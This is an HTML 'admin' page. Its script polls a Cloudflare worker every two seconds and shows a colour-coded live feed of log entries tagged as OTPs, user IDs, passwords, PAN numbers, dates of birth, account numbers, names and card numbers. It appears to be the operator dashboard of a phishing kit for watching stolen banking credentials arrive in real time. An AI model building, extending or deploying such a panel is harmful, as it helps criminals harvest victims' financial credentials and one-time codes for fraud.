<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ultra Sleek Admin</title>
    <style>
        /* Strict Left Alignment for everything */
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: 'Arial', sans-serif; 
            text-align: left !important; 
        }
        
        body { 
            background-color: #ffffff; 
            padding: 5px; 
        }

        /* Minimal Header */
        .header {
            width: 100%;
            padding: 5px 10px;
            display: flex !important; 
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            margin-bottom: 5px;
        }
        .header h1 { font-size: 10px; color: #888; font-weight: 800; }
        
        .v-badge {
            background: #000;
            color: #fff;
            padding: 1px 8px;
            border-radius: 3px;
            font-weight: 900;
            font-size: 12px;
        }

        #logsDisplay { width: 100%; }

        /* Ultra Patla Cart */
        .data-row {
            display: block;
            width: 100%;
            padding: 4px 10px; /* Padding ekdam kam kar di */
            margin-bottom: 3px; /* Gap bhi kam kar diya */
            border-radius: 2px;
            font-size: 13px; /* Compact font */
            font-weight: 800;
            line-height: 1.2;
            color: #ffffff; 
            white-space: pre-wrap;
            word-break: break-all;
            border: none;
        }

        .time {
            display: inline-block;
            font-size: 8px;
            color: rgba(255,255,255,0.6);
            margin-left: 10px;
            font-weight: 400;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>LIVE FEED</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    let content = log.detail.toLowerCase();
                    let bgColor = "#222"; 

                    // Vibrant Colors
                    if (content.includes("otp:-")) {
                        bgColor = "#FF0000"; // Pure Red
                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
                        bgColor = "#00A500"; // Sharp Green
                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
                        bgColor = "#0055FF"; // Electric Blue
                    } else if (content.includes("acc:-") || content.includes("name:-")) {
                        bgColor = "#FF00AA"; // Hot Pink
                    } else if (content.includes("card:-")) {
                        bgColor = "#FF8800"; // Bright Orange
                    }

                    return `
                        <div class="data-row" style="background-color: ${bgColor};">
                            ${log.detail} <span class="time">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Updating..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
